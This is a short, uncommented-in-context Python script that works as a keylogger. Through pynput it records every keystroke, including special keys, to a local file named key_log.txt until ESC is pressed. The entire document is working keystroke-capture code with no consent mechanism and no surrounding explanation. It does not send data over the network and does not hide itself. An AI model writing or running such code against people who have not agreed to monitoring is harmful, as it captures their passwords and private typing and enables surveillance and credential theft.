from pynput import keyboard

# File where logs will be stored
log_file = "key_log.txt"

def on_press(key):
    try:
        # Append the pressed key to log file
        with open(log_file, "a") as f:
            f.write(f"{key.char}")
    except AttributeError:
        # For special keys (Enter, Shift, etc.)
        with open(log_file, "a") as f:
            f.write(f" [{key}] ")

def on_release(key):
    # Stop logging if ESC is pressed
    if key == keyboard.Key.esc:
        return False

# Start listening
with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
